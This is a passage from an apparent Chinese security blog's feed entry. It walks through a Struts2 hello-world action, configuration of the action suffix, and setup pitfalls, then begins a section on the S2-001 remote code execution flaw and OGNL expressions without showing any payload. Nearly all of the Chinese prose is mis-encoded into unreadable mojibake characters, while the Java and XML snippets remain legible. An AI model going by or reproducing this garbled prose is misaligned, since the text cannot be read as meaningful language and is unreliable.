‡ç­¾æ¥åŒ…å«å…¶ä»–é…ç½®æ–‡ä»¶ï¼Œè¿™æœ‰åŠ©äºå°†é…ç½®åˆ†æ•£åˆ°å¤šä¸ªæ–‡ä»¶ä¸­ï¼Œä½¿ä¸»é…ç½®æ–‡ä»¶ä¿æŒç®€æ´ã€‚</li><li><strong>å¸¸é‡å’Œæ–‡æœ¬èµ„æº</strong>ï¼šå®šä¹‰å¯ä»¥åœ¨å¤šä¸ªåœ°æ–¹ä½¿ç”¨çš„å¸¸é‡ï¼Œä»¥åŠå›½é™…åŒ–çš„æ–‡æœ¬èµ„æºã€‚</li><li><strong>åŠ¨æ€æ–¹æ³•è°ƒç”¨</strong>ï¼šå…è®¸ä½ å®šä¹‰ç‰¹å®š Action å¯¹åº”çš„å¤šä¸ªæ–¹æ³•ï¼Œè¿™äº›æ–¹æ³•å¯ä»¥é€šè¿‡è¯·æ±‚å‚æ•°æ¥åŠ¨æ€è°ƒç”¨ã€‚</li></ol><p><strong>å†™ä¸€ä¸ªç®€å•ç¨‹åº</strong></p><p>ç°åœ¨æŒ‰ç…§ä¸Šé¢çš„struts.xmlçš„é…ç½®æ¥å†™ä¸€ä¸ªhellworldçš„ç¨‹åºï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> action;<br><br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.Action;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloWorldAction</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Action</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello Struts2~~&quot;</span>);<br>        <span class="hljs-keyword">return</span> SUCCESS;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç›®å½•ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151444310.png" alt="image-20240510202619138"></p><blockquote><p>é¢è¿™é‡Œé…ç½®æ—¶åˆæœ‰ä¸ªå‘ï¼Œä»–çš„webç›®å½•ä¸‹çš„æœ‰å…³struts2ä¾èµ–çš„jarå…¨éƒ½æ²¡æœ‰è‡ªåŠ¨å¯¼å…¥åˆ°WEB-INF&#x2F;libä¸‹é¢ï¼Œä¼šå¯¼è‡´å¯åŠ¨çš„å‡ºç°è¿‡æ»¤å™¨å¼‚å¸¸çš„é—®é¢˜</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151444311.png" alt="image-20240510202443723"></p><p>æ‰€ä»¥è¦åœ¨è¿™é‡ŒæŠŠå³è¾¹çš„jaråŒ…éƒ½æ·»åŠ è¿‡å»æ‰è¡Œã€‚</p><p>ç„¶åå¯åŠ¨tomcatæœåŠ¡å™¨å³å¯ã€</p><blockquote><p>éš¾ç»·åªèƒ½è¯´åˆè¢«å‘æƒ¨äº†ä¸€æ¬¡ï¼Œè®¿é—®è·¯ç”±æ˜¯éœ€è¦.actionåç¼€çš„ï¼Œä¸ç„¶å°±æ˜¯èµ„æºæœªè®¿é—®ï¼Œéš¾ç»·</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151444312.png" alt="image-20240510205435309"></p><p><img src="http://cdn.clown2024.cn/202407151444313.png" alt="image-20240510205450490"></p><p>è¦ä¿®æ”¹åç¼€å¯ä»¥åœ¨struts.xmlä¸­ä½¿ç”¨è¿™ä¸ªå±æ€§è®¾ç½®</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">constant</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts.action.extension&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>è¿™æ ·å­å¯ä»¥å»æ‰åç¼€ï¼Œä½†åæœæ˜¯æ‰€æœ‰jspæ–‡ä»¶éƒ½ä¸è§£æäº†ï¼Œåªèƒ½ä½¿ç”¨ä¸å¸¦åç¼€çš„è·¯ç”±ï¼Œç„¶åæ ¹ç›®å½•è®¿é—®å°±æ˜¯404è®¿é—®åŠå¤©ä¹Ÿæ‰¾ä¸åˆ°åŸå› æœäº†ï¼Œå°±è¿™æ ·å§</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151444314.png" alt="image-20240510214235237"></p><p><img src="http://cdn.clown2024.cn/202407151444315.png" alt="image-20240510214249703"></p><blockquote><p>ä¸è¿‡è¿™æ ·çœ‹åˆ°åç¼€æ˜¯actionçš„è·¯ç”±å°±èƒ½å¾ˆæ˜æ˜¾çš„åˆ¤æ–­å‡ºæ˜¯statusæ¡†æ¶</p></blockquote><h1><span id="s2-001è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´">S2-001è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</span></h1><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://anquanke.com/post/id/254808">https://anquanke.com/post/id/254808</a></p><p>S2-001çš„æ¼æ´åŸç†æ˜¯æ¨¡æ¿æ–‡ä»¶ï¼ˆJSPï¼‰ä¸­å¼•ç”¨äº†ä¸åˆé€‚çš„æ ‡ç­¾è¿›è¡Œæ¸²æŸ“ï¼Œå¹¶ä¸”æ¸²æŸ“çš„å€¼æ˜¯ç”¨æˆ·å¯æ§çš„ï¼Œæ­¤æ—¶åˆ™è¾¾æˆäº†è¡¨è¾¾å¼æ³¨å…¥çš„ç›®çš„ã€‚</p><p>è¿™ç¯‡æ–‡ç« ä»æºç ä¸Šå»åˆ†æï¼Œååˆ†è¯¦ç»†ï¼Œæˆ‘è¿™é‡Œå°±æ€»ç»“ä¸€ä¸‹é‡ç‚¹çš„åœ°æ–¹</p><h2><span id="ognlè¡¨è¾¾å¼">OGNLè¡¨è¾¾å¼</span></h2><p>è¦å…ˆç®€å•äº†è§£ä¸€ä¸‹OGNLè¡¨è¾¾å¼æ˜¯ä»€ä¹ˆï¼Œå› ä¸ºè¯¥æ¼æ´å°±æ˜¯å’Œè¯¥è¡¨è¾¾å¼æ¸²æŸ“ç›¸å…³è€Œäº§ç”Ÿçš„æ¼æ´</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;struts2ä»‹ç»&quot;&gt;Struts2ä»‹ç»&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;Struts2æ˜¯ä»¥MVCæ¶æ„ä¸ºåŸºç¡€çš„WEBæ¡†æ¶ï¼Œé€šè¿‡WEB Filterçš„æ–¹å¼å†…åµŒåœ¨WEBæœåŠ¡å™¨ä¸­è¿›è¡Œä½¿ç”¨ï¼Œä»–å¯¹servletè¿›è¡Œäº†å°è£…ã€‚&lt;/p&gt;
&lt;p&gt;Struts2ä¸Struts</summary>
      
    
    
    
    <category term="Javaæ¡†æ¶æ¼æ´" scheme="https://clowsman.github.io/categories/Java%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/"/>
    
    
    <category term="Java" scheme="https://clowsman.github.io/tags/Java/"/>
    
  </entry>
  
</feed>
